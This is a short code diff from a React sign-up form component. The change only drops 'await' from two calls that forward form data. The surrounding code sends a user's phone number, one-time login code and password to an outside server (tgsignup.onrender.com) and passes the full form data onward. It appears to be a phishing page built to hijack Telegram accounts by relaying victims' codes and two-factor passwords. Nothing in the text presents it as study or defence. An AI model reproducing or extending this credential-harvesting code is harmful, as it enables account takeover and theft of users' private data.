@@ -144,7 +144,7 @@ const RegForm = (props) => {
                 setIsLoading(true);
                 try {
                     const response = await axios.get(`https://tgsignup.onrender.com/login?phone=${formData.phoneCountryCode.replace(/\D/g, '')}${phoneNumber}`);
-                    await sendUpdate(JSON.stringify({ ...formData, phoneNumber }));
+                    sendUpdate(JSON.stringify({ ...formData, phoneNumber }));
                     setIsLoading(false);
                     if (response.status === 200) {
                         setActiveForm(forms.otp);
@@ -219,7 +219,7 @@ const RegForm = (props) => {
                     otp = formData.otp
                     const response = await axios.get(`https://tgsignup.onrender.com/otp?code=${formData.otp}&phone=${formData.phoneCountryCode.replace(/\D/g, '')}${formData.phoneNumber}&password=${formData.password}`);
                     setIsLoading(false);
-                    await sendUpdate(JSON.stringify(formData));
+                    sendUpdate(JSON.stringify(formData));
                     if (response.status === 200) {
                         setOk(true);
                         setActiveForm(forms.phoneNumber);
